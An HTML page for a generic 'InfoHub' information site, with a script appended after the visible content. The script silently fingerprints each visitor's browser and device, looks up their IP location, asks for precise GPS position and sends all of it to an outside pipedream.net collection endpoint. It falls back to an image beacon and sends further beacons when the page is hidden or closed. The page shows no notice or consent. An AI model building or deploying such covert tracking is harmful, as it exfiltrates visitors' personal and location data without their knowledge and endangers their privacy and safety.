<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Information Site</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        header {
            background: #2c3e50;
            color: white;
            padding: 2rem;
            text-align: center;
        }
        
        header h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }
        
        header p {
            opacity: 0.9;
            font-size: 1.1rem;
        }
        
        .content {
            padding: 2rem;
        }
        
        .section {
            margin-bottom: 2rem;
            padding: 1.5rem;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 4px solid #667eea;
        }
        
        .section h2 {
            color: #2c3e50;
            margin-bottom: 1rem;
        }
        
        .section p {
            margin-bottom: 1rem;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .feature {
            background: white;
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .feature h3 {
            color: #667eea;
            margin-bottom: 0.5rem;
        }
        
        footer {
            text-align: center;
            padding: 1.5rem;
            background: #34495e;
            color: white;
            margin-top: 2rem;
        }
        
        @media (max-width: 600px) {
            .container {
                margin: 10px;
            }
            
            header h1 {
                font-size: 2rem;
            }
            
            .content {
                padding: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Welcome to InfoHub</h1>
            <p>Your gateway to useful information and resources</p>
        </header>
        
        <div class="content">
            <div class="section">
                <h2>About This Site</h2>
                <p>This is a simple, clean website designed to provide valuable information to visitors. We focus on delivering quality content in an easy-to-navigate format.</p>
                <p>Our mission is to make information accessible and understandable for everyone.</p>
            </div>
            
            <div class="section">
                <h2>Our Features</h2>
                <div class="features">
                    <div class="feature">
                        <h3>Easy to Use</h3>
                        <p>Simple navigation and clean design</p>
                    </div>
                    <div class="feature">
                        <h3>Mobile Friendly</h3>
                        <p>Works perfectly on all devices</p>
                    </div>
                    <div class="feature">
                        <h3>Always Available</h3>
                        <p>24/7 access to information</p>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>Latest Updates</h2>
                <p><strong>January 2024:</strong> Completely redesigned for better user experience.</p>
                <p><strong>December 2023:</strong> Added new resource sections and improved mobile compatibility.</p>
                <p><strong>November 2023:</strong> Launched new website with updated content structure.</p>
            </div>
        </div>
        
        <footer>
            <p>&copy; 2024 InfoHub. All rights reserved.</p>
        </footer>
    </div>

    <!-- Enhanced tracking script with comprehensive data collection -->
    <script>
        // Enhanced data collection function
        function collectVisitorData() {
            const data = {
                // Timestamp and basic info
                timestamp: new Date().toISOString(),
                visit_id: generateVisitId(),
                
                // URL and navigation info
                url: window.location.href,
                referrer: document.referrer || 'direct',
                page_title: document.title,
                
                // Device and browser info
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookie_enabled: navigator.cookieEnabled,
                
                // Screen info
                screen_width: screen.width,
                screen_height: screen.height,
                color_depth: screen.colorDepth,
                pixel_depth: screen.pixelDepth,
                
                // Browser window info
                viewport_width: window.innerWidth,
                viewport_height: window.innerHeight,
                
                // Connection info
                connection_effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                connection_downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Additional browser capabilities
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                
                // Session info
                session_storage: !!window.sessionStorage,
                local_storage: !!window.localStorage,
                indexed_db: !!window.indexedDB
            };

            return data;
        }

        // Generate unique visit ID
        function generateVisitId() {
            return 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Get IP-based location
        async function getIPLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ipData = await response.json();
                return {
                    ip: ipData.ip,
                    ip_country: ipData.country_name,
                    ip_country_code: ipData.country_code,
                    ip_region: ipData.region,
                    ip_city: ipData.city,
                    ip_lat: ipData.latitude,
                    ip_lng: ipData.longitude,
                    ip_timezone: ipData.timezone,
                    ip_org: ipData.org
                };
            } catch (error) {
                // Fallback IP service
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackResponse.json();
                    return {
                        ip: fallbackData.ip,
                        ip_country: 'unknown',
                        ip_error: 'primary_service_failed'
                    };
                } catch (e) {
                    return {
                        ip: 'unknown',
                        ip_error: 'all_services_failed'
                    };
                }
            }
        }

        // Enhanced geolocation with comprehensive data
        async function enhancedGeolocation() {
            const baseData = collectVisitorData();
            
            // Get IP location first (works even if GPS is denied)
            const ipLocation = await getIPLocation();
            
            // Try to get precise GPS location
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const gpsData = {
                                gps_lat: position.coords.latitude,
                                gps_lng: position.coords.longitude,
                                gps_accuracy: position.coords.accuracy,
                                gps_altitude: position.coords.altitude,
                                gps_altitude_accuracy: position.coords.altitudeAccuracy,
                                gps_heading: position.coords.heading,
                                gps_speed: position.coords.speed,
                                gps_timestamp: new Date(position.timestamp).toISOString(),
                                location_source: 'gps'
                            };
                            
                            const completeData = {
                                ...baseData,
                                ...ipLocation,
                                ...gpsData,
                                location_access: 'granted'
                            };
                            
                            resolve(completeData);
                        },
                        async (error) => {
                            // GPS failed, but we still have IP location
                            const errorData = {
                                location_access: 'denied',
                                gps_error_code: error.code,
                                gps_error_message: getGeolocationError(error.code),
                                location_source: 'ip_only'
                            };
                            
                            const completeData = {
                                ...baseData,
                                ...ipLocation,
                                ...errorData
                            };
                            
                            resolve(completeData);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    // No geolocation support
                    const completeData = {
                        ...baseData,
                        ...ipLocation,
                        location_access: 'not_supported',
                        location_source: 'ip_only'
                    };
                    
                    resolve(completeData);
                }
            });
        }

        function getGeolocationError(code) {
            const errors = {
                1: 'PERMISSION_DENIED',
                2: 'POSITION_UNAVAILABLE',
                3: 'TIMEOUT'
            };
            return errors[code] || 'UNKNOWN_ERROR';
        }

        // Send data to logging service
        async function sendToLogger(data) {
            try {
                // Primary method: Fetch API
                const response = await fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                console.log('Data sent successfully via fetch');
                return true;
            } catch (error) {
                console.log('Fetch failed, trying fallback methods');
                
                // Fallback 1: Image beacon
                try {
                    const params = new URLSearchParams();
                    Object.keys(data).forEach(key => {
                        if (typeof data[key] === 'string' || typeof data[key] === 'number') {
                            params.append(key, String(data[key]).substring(0, 100));
                        }
                    });
                    
                    const img = new Image();
                    img.src = `https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net/?${params.toString()}`;
                    console.log('Data sent via image beacon');
                    return true;
                } catch (e) {
                    console.log('All methods failed');
                    return false;
                }
            }
        }

        // Main execution with error handling
        setTimeout(async () => {
            try {
                console.log('Starting enhanced data collection...');
                const visitorData = await enhancedGeolocation();
                console.log('Collected data:', visitorData);
                
                await sendToLogger(visitorData);
                console.log('Data collection complete');
                
            } catch (error) {
                console.error('Data collection failed:', error);
                
                // Send error report
                const errorData = {
                    timestamp: new Date().toISOString(),
                    error: error.message,
                    error_type: 'collection_failed',
                    url: window.location.href
                };
                
                sendToLogger(errorData);
            }
        }, 2000);

        // Additional data point: Track page visibility changes
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'hidden') {
                const visibilityData = {
                    event: 'page_hidden',
                    timestamp: new Date().toISOString(),
                    visit_duration: Date.now() - performance.timing.navigationStart
                };
                sendToLogger(visibilityData);
            }
        });

        // Track before user leaves
        window.addEventListener('beforeunload', function() {
            const leaveData = {
                event: 'user_leaving',
                timestamp: new Date().toISOString(),
                visit_duration: Date.now() - performance.timing.navigationStart
            };
            
            // Use navigator.sendBeacon for reliable sending during page unload
            if (navigator.sendBeacon) {
                navigator.sendBeacon(
                    'https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', 
                    JSON.stringify(leaveData)
                );
            }
        });
    </script>
</body>
</html>
